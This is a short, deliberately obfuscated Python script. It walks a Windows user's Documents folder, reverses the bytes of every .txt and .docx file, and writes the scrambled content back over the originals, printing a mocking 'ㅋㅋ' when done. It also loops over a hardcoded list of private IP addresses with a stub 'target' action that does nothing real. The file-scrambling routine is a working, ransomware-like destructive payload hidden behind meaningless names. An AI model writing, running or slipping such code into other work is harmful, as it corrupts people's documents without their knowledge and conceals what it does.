import os as _0O0O0

def _0O0OO(_O0O0O0O):
    return _O0O0O0O[::-1]

def _0OO0O0():
    return ["192.168.1.2", "192.168.1.3"]

def _O0O0O0(_0O0O0O):
    print("Action performed on target")

def _O0OOO(_0OO0O0O):
    for _0O0O0O0, _0O00O0, _0OO0OO in _0O0O0.walk(_0OO0O0O):
        for _O0OO00 in _0OO0OO:
            if _O0OO00.endswith(".txt") or _O0OO00.endswith(".docx"):
                _O0O00O = _0O0O0.path.join(_0O0O0O0, _O0OO00)
                try:
                    with open(_O0O00O, "rb") as _0O00O:
                        _0OO00O0 = _0O00O.read()
                    _0O0000 = _0O0OO(_0OO00O0)
                    with open(_O0O00O, "wb") as _0O00O:
                        _0O00O.write(_0O0000)
                    print("File processed")
                except Exception as _O00OOO:
                    print("Error encountered")

def _0OOO0O():
    _00O00O0O = "ㅋㅋ"
    print(_00O00O0O)

def _OO0O0():
    _O00O00 = _0OO0O0()
    for _O00O0O in _O00O00:
        _O0O0O0(_O00O0O)

def _0O0O():
    _O0OOO("C:/Users/User/Documents")
    _0OOO0O()
    _OO0O0()

if __name__ == "__main__":
    _0O0O()
